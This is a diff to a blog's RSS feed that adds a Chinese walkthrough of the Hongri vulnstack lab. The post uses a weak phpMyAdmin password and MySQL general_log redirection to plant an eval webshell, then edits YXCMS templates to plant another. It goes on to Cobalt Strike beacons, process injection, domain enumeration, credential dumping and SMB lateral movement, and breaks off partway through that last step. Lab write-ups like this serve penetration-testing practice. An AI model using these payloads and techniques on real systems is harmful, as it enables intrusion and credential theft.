@@ -7,7 +7,869 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>xxxx</copyright>
-        <lastBuildDate>Wed, 11 Mar 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://xxxxctfer.github.io/categories/web%E4%BA%BA/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 25 Mar 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://xxxxctfer.github.io/categories/web%E4%BA%BA/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>红日靶机练习(第一章)</title>
+        <link>https://xxxxctfer.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E7%AB%A0/</link>
+        <pubDate>Wed, 25 Mar 2026 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxxctfer.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%AC%E4%B8%80%E7%AB%A0/</guid>
+        <description>&lt;img src="https://xxxxctfer.github.io/images/hongri/Attack1/%E9%9D%B6%E5%9C%BA1.3.png" alt="Featured image of post 红日靶机练习(第一章)" /&gt;&lt;p&gt;首先先访问一下靶场的地址。http://vulnstack.qiyuanxuetang.net/vuln/，东西很多，不止蓝队的，红队的也有，留好存储空间，然后把靶场下载下来，这里是写的第一个靶场的。&lt;/p&gt;
+&lt;h1 id=&#34;环境搭建&#34;&gt;环境搭建
+&lt;/h1&gt;&lt;p&gt;下载好之后是三个虚拟机的vmx文件，直接加载进去VMware中，然后配置一下虚拟网段。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.1.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我这里设置了一下网段的IP是多少的，这里设的是192.168.52.0/24的，然后我们另外两台虚拟机设置为这个网段的就行，主要是win7的虚拟机，因为是入口机，所以这里要给他一个出网的网段。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.2.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;设置好了之后就可以开启虚拟机了，一般来说密码是hongrisec@2019，但是除了win7，另外两台要改密码，不过直接改就行了，这个问题不大。改了之后我们可以测试win7能不能出网，直接ping baidu.com就行。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.3.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;很明显是可以出网的了，然后我们去C盘里面找到phpstudy来，直接打开服务，然后就可以访问了，用另外两台机子访问一下，可以看到有这个服务了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;IP自己去打ipconfig就可以找到。然后环境就搭建好了，我们来打。&lt;/p&gt;
+&lt;h1 id=&#34;入口机信息收集get-webshell&#34;&gt;入口机(信息收集/get webshell)
+&lt;/h1&gt;&lt;p&gt;OK，这里模拟网络情况，是可以直接访问IP看到这个phpstudy。然后暂时还不知道内网IP段，这里先直接dirsearch扫描一遍。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.5.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;很明显，扫出来一个phpMyadmin，说明有mysql的数据库，然后还有一个phpinfo.php，可以去翻一翻配置信息。这里就不看了，我们可以直接去看mysql。(其实探针那里还有可以说明的，等下说)
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.6.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;测试一下弱口令就进去了，还是比较简单的，降低了难度。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.7.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;探针这里有一个链接检测的东西，可以测试用户密码，这里也可以直接告诉我们有mysql，并且可以测试出弱口令。
+然后成功进去之后要去拿shell了，先看可不可以写文件。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.8.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;好，直接就是一个写不了，那再看看日志的路径，看看可不可以日志包含去打。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.9.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，有这个东西，我们可以去改日志路径，然后写PHP代码进去，打一个webshell出来。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;GLOBAL&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;general_log_file&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\\phpStudy\\WWW\\xxxx.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;GLOBAL&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;general_log&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php @eval($_POST[&amp;#34;xxxx&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject_code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们按这一段payload去打，基本上就可以打出来，我们这里先SET一下，然后查询看看是啥情况。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.10.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;很明显已经OK了，现在直接打代码进去，然后蚁剑连接即可。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.11.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，可以看到是连接成功了啊，我们直接去开shell看看。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.12.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK了，这里应该是没什么毛病了。
+发现有一个cms在里面，一开始没搞出来的。(字典太菜了)
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.19.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;现在看看怎么打吧。然后有一个公告信息，提示我们要去后台管理界面，这里是靶场，真实环境下不能这么敷衍，cms要去打基本上就是找找源代码，看看后台登录在哪里，弱口令尝试一下先，一个初步思路。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.20.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后我们就可以去登录了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.21.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功登录啊，简单看看功能，有没有可以getshell的地方。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.52.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看到有一个前台模板管理的页面，可以去编辑PHP代码，那很明显我们可以去编写一个一句话木马进去到一个文件中，但是要去找到这些模板文件在哪里。我们随便找一找或者扫描一下这个URL，就可以扫到一个robots.txt文件，内容如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# robots.txt for YXCMS
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-agent: * 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disallow: /data
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disallow: /protected
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们直接看protected的路径下面，就可以看到一个类似文件管理的页面。(其实这里目录扫描可以扫除网站源代码出来，直接找文件路径就行，不过也差不多)
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.22.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;随便往下面找找就可以找到前面放的一句话木马，我这里用的info.php，在http://192.168.200.143/yxcms/protected/apps/default/view/default/目录下就可以找到，然后直接蚁剑连接即可。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.23.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;权限维持webshell提升至shell&#34;&gt;权限维持(webshell提升至shell)
+&lt;/h1&gt;&lt;p&gt;有一个之前没有思考过的东西就是这里平常就是直接打后续了，没有换shell，这里换shell的方式还挺多的，先记录一下，有时间都会练习一下。这里先用CS打一下吧。
+先去github上面下载一下工具。https://github.com/k8gege/Aggressor/releases/tag/cs，这里下的是K8_CS的版本，方便启动一点，然后到kali上面直接解压出来，然后就可以打命令了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./teamserver 192.168.200.130 &lt;span class=&#34;m&#34;&gt;123456&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Windows主机上面启动：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java -XX:ParallelGCThreads&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:uHook.jar -Dfile.encoding&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8 -jar cobaltstrike-client.jar
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;或者可执行的脚本一键启动
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后就可以顺利启动图形化界面了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.13.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后直接连接即可。连接上了之后我们就可以准备监听了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.14.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后我们就可以让他生成恶意的exe文件出来了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.16.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;生成之后就可以上传到蚁剑上面，然后直接运行即可。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.17.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后就可以在CS这边看到上线的主机了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.18.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，这里差不多就有一个可持续后门了。然后我们就可以去做一下权限维持相关的东西，也算是学习一下CS的用法吧。&lt;/p&gt;
+&lt;h1 id=&#34;权限维持&#34;&gt;权限维持
+&lt;/h1&gt;&lt;p&gt;还是以CS的为例啊，我们双击监听到的主机之后，就可以启动他的shell，或者说是cmd，这个无所谓，我们的木马exe比较容易被删，我们这里先ps看看有什么常见的进程，对了先用sleep调一下响应时间，默认是60s，太慢了，建议sleep 3。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.24.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看了一遍啊，我们这里选择用
+&lt;strong&gt;888   224   explorer.exe                           x64   1           GOD\Administrator&lt;/strong&gt;
+这个进程，直接使用inject去注入。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.25.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后会弹一个窗口出来，我们选择一下监听器。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.26.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;很难绷啊，这里要设置一下架构，不然默认x86，即32位的，64位程序就注入不进去了，这里就已经成功注入了，我们去删一下我们前面这个进程。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.27.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，成功下线木马程序。然后我们就可以开始域渗透了。&lt;/p&gt;
+&lt;h1 id=&#34;内网信息收集&#34;&gt;内网信息收集
+&lt;/h1&gt;&lt;p&gt;我们先来做一下内网的信息收集。分下面几个步骤进行吧，如果后续有新东西也会继续补充。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;确认木马的权限
+&lt;code&gt;getpid&lt;/code&gt;和&lt;code&gt;getsystem&lt;/code&gt;，可以确认当前的权限&lt;/li&gt;
+&lt;li&gt;查看局域网内的其他主机名
+常用命令是&lt;code&gt;net view&lt;/code&gt;，其他的也放在下面了。&lt;/li&gt;
+&lt;li&gt;确认域后缀，是哪个域的，有几个域，域主机名
+&lt;code&gt;shell ipconfig/all&lt;/code&gt;，&lt;code&gt;shell net view /domain&lt;/code&gt;，&lt;code&gt;run net group &amp;quot;domain controllers&amp;quot; /domain&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;找到域控服务器的主机和内网IP
+加上域后缀来ping对应的主机，就可以找到对应的域控服务器了。&lt;code&gt;shell ping 主机名.域后缀&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;查看局域网内的其他主机名：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net view                 # 查看局域网内其他主机名
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user                 # 查看本机用户列表
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user /domain         # 查看域用户
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net localgroup administrators # 查看本地管理员组（通常会有域用户）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net view /domain         # 查看有几个域
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user 用户名 /domain   # 获取指定域用户的信息
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group 组名 /domain    # 查看域中某工作组
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &amp;#34;domain admins&amp;#34; /domain  # 查看域管理员的名字
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &amp;#34;domain computers&amp;#34; /domain  # 查看域中的其他主机名
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &amp;#34;doamin controllers&amp;#34; /domain  # 查看域控制器主机名（可能有多台）
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;OK，大概了解了一下之后，我们就可以开始打命令了。
+先看权限。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.28.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，设置好了，然后再去看域中其他主机。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.29.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里自己的主机没显示出来，但是后面也可以看到。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.30.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到域名后缀是&lt;code&gt;god.org&lt;/code&gt;，然后我们看一下域控是谁。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.31.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK了，那就确定主机名是owa了，我们直接去ping一下owa.god.org
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.32.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，确定了，信息收集差不多先这样，我们后面就是打横向了。&lt;/p&gt;
+&lt;h1 id=&#34;横向移动&#34;&gt;横向移动
+&lt;/h1&gt;&lt;p&gt;我们先来看看这个域控有没有什么存活的服务，扫一下它的端口，看看有什么东西不。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.33.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;扫了有一定时间，发现都开了445端口。那估计有点东西，我们搜索一下，发现是smb服务，我们直接用CS来接着打，先创建一下smb的监听。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.34.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;保存一下，然后直接去抓明文密码。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.35.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后就可以抓到明文密码了，这里不需要去记，CS会帮你记住。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.36.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们就可以用CS的功能直接横向移动了。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.37.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里已经记录了我们要的目标。然后我们直接选择一下，右键直接横向移动就行。
+&lt;img src=&#34;https://xxxxctfer.github.io/images/hongri/Attack1/%e9%9d%b6%e5%9c%ba1.38.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
